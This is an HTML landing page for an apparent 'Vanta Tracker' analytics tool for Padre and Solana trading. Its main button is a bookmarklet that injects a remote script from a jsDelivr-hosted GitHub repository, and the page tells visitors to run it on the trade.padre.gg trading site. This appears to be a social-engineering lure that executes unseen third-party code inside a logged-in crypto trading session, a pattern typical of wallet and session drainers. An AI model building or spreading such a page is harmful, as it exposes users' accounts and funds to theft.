<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vanta Tracker | Advanced Twitter Analytics</title>
    <style>
        :root { --p: #00ff88; --bg: #050505; }
        body, html { margin: 0; padding: 0; background: var(--bg); color: #fff; font-family: 'Segoe UI', Roboto, sans-serif; overflow-x: hidden; }
        #vnt-canvas { position: fixed; top: 0; left: 0; z-index: -1; width: 100%; height: 100%; opacity: 0.5; }
        header { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; background: radial-gradient(circle at center, #001a0d 0%, var(--bg) 70%); }
        h1 { font-size: 4rem; margin: 0; color: var(--p); text-transform: uppercase; letter-spacing: 5px; filter: drop-shadow(0 0 10px var(--p)); }
        p { color: #888; font-size: 1.2rem; max-width: 600px; margin: 20px 0; }
        .btn { display: inline-block; padding: 20px 50px; background: var(--p); color: #000; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 1.1rem; box-shadow: 0 0 20px rgba(0,255,136,0.3); transition: 0.3s; cursor: grab; }
        .btn:hover { transform: scale(1.05); box-shadow: 0 0 40px var(--p); }
        .steps { padding: 50px; background: rgba(255,255,255,0.02); border-top: 1px solid #111; text-align: center; }
        li { margin-bottom: 15px; color: #ccc; list-style: none; }
    </style>
</head>
<body>
    <div id="vnt-canvas"></div>
    <header>
        <h1>VANTA TRACKER</h1>
        <p>The premier node-based monitoring tool for Padre and Solana ecosystems.</p>
        
        <a href="javascript:(function(){var s=document.createElement('script');s.src='https://cdn.jsdelivr.net/gh/Vanta-Dev-Pages/Vanta@Vanta/engine.js?v='+Date.now();document.body.appendChild(s);})();" class="btn">
            VANTA TRACKER
        </a>
        
        <div style="margin-top: 40px;">
            <li>1. Drag button to your Bookmarks Bar</li>
            <li>2. Open trade.padre.gg</li>
            <li>3. Click bookmark to sync nodes</li>
        </div>
    </header>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.net.min.js"></script>
    <script>
        VANTA.NET({ el: "#vnt-canvas", mouseControls: true, touchControls: true, gyroControls: false, minHeight: 200.0, minWidth: 200.0, scale: 1.0, scaleMobile: 1.0, color: 0x00ff88, backgroundColor: 0x050505, points: 15.0, maxDistance: 20.0, spacing: 16.0 });
    </script>
</body>
</html>
